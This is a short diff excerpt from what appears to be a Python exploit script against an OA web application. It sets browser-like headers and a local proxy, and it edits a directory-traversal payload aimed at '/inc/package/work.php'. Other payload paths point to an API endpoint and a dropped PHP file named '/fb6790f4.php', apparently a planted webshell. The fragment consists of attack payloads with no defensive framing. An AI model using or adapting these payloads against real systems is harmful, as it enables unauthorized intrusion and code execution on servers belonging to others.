@@ -19,7 +19,7 @@ header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Geck
           "Accept-Encoding": "gzip"
           }
 payload2='/mobile/api/api.ali.php'
-payload3='/inc/package/work.php?id=../../../../../myoa/attach/approve_center/{}/>>>>>>>>>>>.fb6790f4'.format(a)
+payload3='/inc/package/work.php?id=../../../../attach/approve_center/{}/>>>>>>>>>>>.fb6790f4'.format(a)
 payload4 = '/fb6790f4.php'
 proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
 
